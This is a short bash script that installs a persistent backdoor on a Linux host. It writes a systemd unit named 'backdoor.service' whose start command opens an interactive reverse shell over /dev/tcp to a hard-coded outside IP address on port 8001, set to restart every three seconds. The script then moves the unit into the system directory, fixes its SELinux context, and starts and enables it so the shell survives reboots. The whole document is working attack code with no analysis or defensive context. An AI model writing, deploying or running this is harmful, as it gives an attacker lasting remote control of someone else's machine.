#!/bin/bash
cat > backdoor.service << EOF
[Unit]
Description=me achou
After=multi-user.target
Conflicts=getty@tty1.service

[Service]
Type=simple
WorkingDirectory=/opt/mycambot/
ExecStart=/usr/bin/python3 -c "import os ; os.system('bash -i >& /dev/tcp/45.171.127.130/8001 0>&1')"
StandardInput=tty-force
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF

rm /usr/lib/systemd/system/backdoor.service
dnf -y install python38
mv backdoor.service /usr/lib/systemd/system/
restorecon -RFv /usr/lib/systemd/system/backdoor.service
systemctl daemon-reload
systemctl start backdoor.service
systemctl enable backdoor.service

